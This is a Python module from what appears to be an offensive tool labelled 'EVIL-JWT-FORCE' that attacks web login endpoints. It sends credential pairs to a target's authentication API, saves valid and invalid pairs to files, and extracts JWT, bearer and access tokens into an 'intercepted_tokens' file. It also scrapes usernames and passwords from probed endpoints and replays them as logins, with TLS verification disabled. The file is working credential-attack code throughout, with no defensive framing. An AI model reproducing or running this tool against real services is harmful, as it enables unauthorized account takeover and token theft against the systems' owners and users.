import httpx
import json
import re
from typing import List, Tuple
from pathlib import Path
from utils.helpers import save_to_file
from utils.request_builder import build_headers, build_payload
from config.constants import VALID_CREDS_FILE, INVALID_CREDS_FILE

HEADERS = {
    "User-Agent": "EVIL-JWT-FORCE/1.0",
    "Accept": "application/json"
}

class Authenticator:
    def __init__(self, url, proxy=None):
        self.url = url
        self.client = httpx.Client(proxies=proxy, verify=False, timeout=15.0)
        
    def authenticate(self, username: str, password: str) -> bool:
        try:
            headers = build_headers()
            payload = build_payload(username, password)
            response = self.client.post(self.url, headers=headers, data=payload)
            
            if response.status_code == 200:
                self._save_credentials(username, password, valid=True)
                self._extract_jwt(response.text)
                return True
            else:
                self._save_credentials(username, password, valid=False)
                return False
                
        except Exception as e:
            print(f"Authentication error: {e}")
            return False
            
    def _save_credentials(self, username: str, password: str, valid: bool):
        file_path = VALID_CREDS_FILE if valid else INVALID_CREDS_FILE
        Path(file_path).parent.mkdir(parents=True, exist_ok=True)
        save_to_file(file_path, f"{username}:{password}")
        
    def _extract_jwt(self, response_text: str):
        try:
            data = json.loads(response_text)
            token = data.get('token') or data.get('jwt') or data.get('access_token')
            
            if not token:
                match = re.search(r'Bearer\s+([A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*)', response_text)
                if match:
                    token = match.group(1)
            
            if token:
                save_to_file("output/intercepted_tokens.txt", token)
                
        except json.JSONDecodeError:
            pass

def save_cred(username: str, password: str, valid: bool):
    path = VALID_CREDS_FILE if valid else INVALID_CREDS_FILE
    Path(path).parent.mkdir(parents=True, exist_ok=True)
    with open(path, "a") as f:
        f.write(f"{username}:{password}\n")

def parse_creds_from_response(response_text: str) -> List[Tuple[str, str]]:
    pattern_json = r'"username"\s*:\s*"?(\w+)"?.+?"password"\s*:\s*"?(\w+)"?'
    pattern_text = r"(admin|user\d{1,4})[:|=](pass\w+)"
    json_matches = re.findall(pattern_json, response_text)
    text_matches = re.findall(pattern_text, response_text)
    return json_matches + text_matches

def try_login(base_url: str, username: str, password: str) -> bool:
    login_url = f"{base_url}/api/auth/login"
    payload = {"username": username, "password": password}
    try:
        r = httpx.post(login_url, json=payload, headers=HEADERS, timeout=10)
        if r.status_code == 200 and "token" in r.text:
            save_cred(username, password, valid=True)
            return True
        else:
            save_cred(username, password, valid=False)
            return False
    except Exception as e:
        print(f"[ERROR] Failed login: {e}")
        return False

def auto_discovery(base_url: str, endpoints: List[str]) -> List[Tuple[str, str]]:
    found_creds = []
    for endpoint in endpoints:
        try:
            url = f"{base_url}/{endpoint.lstrip('/')}"
            r = httpx.get(url, headers=HEADERS, timeout=10)
            found = parse_creds_from_response(r.text)
            for u, p in found:
                if try_login(base_url, u, p):
                    found_creds.append((u, p))
        except Exception as e:
            print(f"[ERROR] Could not fetch {endpoint}: {e}")
    return found_creds
